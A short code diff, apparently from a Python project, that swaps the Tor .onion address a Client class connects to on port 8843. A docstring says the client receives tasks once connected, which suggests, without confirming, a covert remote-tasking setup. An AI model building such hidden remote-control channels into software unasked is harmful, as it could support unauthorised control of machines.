@@ -7,7 +7,7 @@ class Client:
 
 	def __init__(self):
 		self.__tor = Tor()
-		self.__sock = ClientSocket('4u2hjbuzegxrppe2d37majzc3ttpk2hiks2k6ggcduejcl7zehcpguad.onion', 8843)
+		self.__sock = ClientSocket('mzdaxxejpx6yy47nifqvul44dfh6klhnmdsqmxakkrcabue2tjlb36ad.onion', 8843)
 
 	"""
 	Once the connection is established the client receives tasks,
